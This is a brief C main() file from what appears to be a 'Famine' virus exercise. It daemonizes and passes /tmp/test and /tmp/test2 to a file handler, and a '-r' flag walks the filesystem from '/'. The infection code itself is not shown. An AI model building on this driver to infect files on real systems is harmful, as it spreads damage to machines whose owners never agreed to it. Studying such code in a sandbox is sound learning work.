#include <ft_famine.h>


int main(int argc, char **argv)
{
    if (argc > 2) 
    { 
        usage();
        return 1;
    }
    (void)argv;
    struct stat stats;
    char        *path_test  = "/tmp/test";
    char        *path_test2 = "/tmp/test2";
    char        *root = "/";
    int         ret = 0;

    daemonize();

    if (argc > 1 && !ft_strcmp(argv[1], "-r"))
    {
        ret = file_handler(root, true);
        return ret;
    }
    
    if(stat(path_test, &stats) == 0 && S_ISDIR(stats.st_mode))
    {
        ret = file_handler(path_test, false);
    }
    if(stat(path_test2, &stats) == 0 && S_ISDIR(stats.st_mode))
    {
        ret = file_handler(path_test2, false);
    }
    return ret;

    
}